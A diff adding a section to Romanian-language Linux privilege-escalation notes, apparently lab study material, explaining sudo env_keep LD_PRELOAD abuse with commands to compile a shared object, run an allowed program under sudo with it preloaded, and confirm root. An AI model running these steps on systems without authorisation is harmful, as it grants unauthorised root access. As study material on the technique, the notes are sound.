@@ -83,3 +83,30 @@ Condiții preliminare: serviciul MySQL rulează ca `root` și permite autentific
 * Curățare artefacte:
   `rm /tmp/rootbash`
   `exit`
+
+---
+
+## 5. Sudo Environment Variables (LD_PRELOAD)
+
+### Mecanism & Vulnerabilitate
+La rularea `sudo -l`, dacă în secțiunea `env_keep` apare definit:
+Defaults    env_keep += LD_PRELOAD
+
+Înseamnă că `sudo` nu curăță variabila de mediu `LD_PRELOAD` la tranziția către administrator. Linker-ul dinamic (`ld.so`) este forțat să încarce biblioteca specificată înaintea oricărei alte biblioteci a programului țintă. Deoarece programul rulează prin `sudo`, codul din biblioteca injectată este executat direct cu privilegii de `root` (`uid=0`).
+
+### Pași de exploatare
+
+1. Compilare fișier Shared Object (.so):
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+* -fPIC: Position Independent Code (necesar pentru biblioteci partajate).
+* -shared: Generează fișierul .so.
+* -nostartfiles: Omite funcția standard de start (main).
+
+2. Execuție via sudo cu injectare de bibliotecă:
+Se poate folosi orice program permis în sudo -l (ex: apache2):
+sudo LD_PRELOAD=/tmp/preload.so apache2
+
+3. Verificare privilegii:
+id
+* Output așteptat: uid=0(root) gid=0(root) groups=0(root)
+
